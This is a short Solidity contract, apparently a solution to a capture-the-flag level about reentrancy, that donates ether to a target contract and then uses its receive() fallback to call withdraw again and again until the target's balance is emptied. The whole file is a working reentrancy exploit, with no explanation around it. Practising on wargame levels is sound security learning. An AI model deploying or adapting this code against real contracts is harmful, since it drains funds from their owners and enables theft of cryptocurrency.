// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface ILevel {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceRun { 
    address levelAddress;
    uint donateAmount;  

    function run(address _levelAddress) external payable {
        levelAddress = _levelAddress;
        donateAmount = msg.value;
        ILevel(levelAddress).donate{value:donateAmount}(address(this));
        ILevel(levelAddress).withdraw(donateAmount);
    }
    //重入withdraw
    receive() external payable {
        uint256 levelBalance = payable(levelAddress).balance;
        if (msg.sender == levelAddress && levelBalance !=0 ) {
            ILevel(levelAddress).withdraw(donateAmount>levelBalance?levelBalance:donateAmount);
        }
    }

}